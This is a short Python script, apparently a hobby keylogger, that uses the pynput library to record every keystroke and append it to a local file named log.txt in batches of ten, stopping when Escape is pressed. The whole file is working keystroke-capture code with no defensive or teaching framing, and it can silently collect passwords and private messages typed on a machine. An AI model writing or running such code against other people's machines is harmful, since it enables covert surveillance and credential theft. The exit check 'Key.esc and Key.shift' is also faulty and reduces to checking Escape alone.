import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    
    keys.append(key)
    count += 1

    #updates file after x(10) key presses
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open('log.txt', 'a') as f:#a is for append, use w if file isn't created yet
        for key in keys:
            k = str(key).replace("'","")#instead of 'a' it will just be a

            #if space is pressed then it creates a new line in the text file
            if k.find('space') > 0:
                f.write('\n')

            #if enter is pressed then it creates a new line in the text file    
            if k.find('enter') > 0:
                f.write('\n')
                
            elif k.find('Key') == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc and Key.shift:#esc and shift
        #quit()#console exit
        return False

with Listener (on_press=on_press, on_release=on_release) as listener:
    listener.join()
